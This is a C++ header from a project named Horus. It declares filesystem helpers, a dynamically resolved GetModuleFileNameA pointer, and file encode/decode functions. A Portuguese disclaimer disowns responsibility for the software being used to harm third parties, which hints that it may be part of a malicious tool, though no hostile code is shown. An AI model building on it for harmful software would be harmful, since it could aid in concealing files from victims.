/*
	This file is part of Horus.
	
	Copyright (C) 2021  Horus Project

	O autor não se responsabiliza por variantes (ou sources originais) deste software 
	que estejam sendo utilizadas para prejudicar terceiros.
*/

#ifndef FS_HPP
#define FS_HPP

#include <windows.h>
#include <string>
#include <filesystem>

#define FS_BUFLEN	256

/**
 * @brief Checks if x is a node directory
 * 
 */
#define IS_NODE_DIR(x)	((strncmp(x, ".", 1) == 0) || (strncmp(x, "..", 2) == 0))

#ifdef WIN32
#define IS_FOLDER(x)	(GetFileAttributesA(x) & FILE_ATTRIBUTE_DIRECTORY)
#else
#define IS_FOLDER(x)	(void)x
#endif

/**
 * @brief Function pointer to GetModuleFileNameA from WINAPI
 * 
 */
typedef DWORD (WINAPI *gmfn)(HMODULE, LPTSTR, DWORD);

/**
 * @brief FS class is the filesystem class
 * 
 */
class FS {

public:
	/**
	 * @brief Retrieves the fully qualified path for the file that contains the specified module. 
	 * The module must have been loaded by the current process.
	 * 
	 * @param hmodule A handle to the loaded module whose path is being requested
	 * @param path  pointer to a buffer that receives the fully qualified path of the module
	 * @param len The size of the lpFilename buffer
	 * @return DWORD If the function succeeds, the return value is the length of the string that is copied 
	 * to the buffer, in characters, not including the terminating null character
	 */
	static DWORD GetModuleFilename(HMODULE hmodule, LPTSTR path, DWORD len);

	/**
	 * @brief Get the Filename object
	 * 
	 * @param path 
	 * @return string 
	 */
	static std::string GetFilename(std::string path);

	/**
	 * @brief Encode a file using the internal encoding algorithm
	 * 
	 * @param from Full path to file to be encoded
	 * @param to Full path to file to be decoded
	 * @return true On success
	 * @return false On error
	 */
	static bool EncodeFile(std::string from, std::string to);

	/**
	 * @brief Dncode a file that has been previously encoded with internal encoding algorithm
	 * 
	 * @param from Full path to file to be decoded
	 * @param to Full path to file with decoded data
	 * @return true On success
	 * @return false On error
	 */
	static bool DecodeFile(std::string from, std::string to);
};

#endif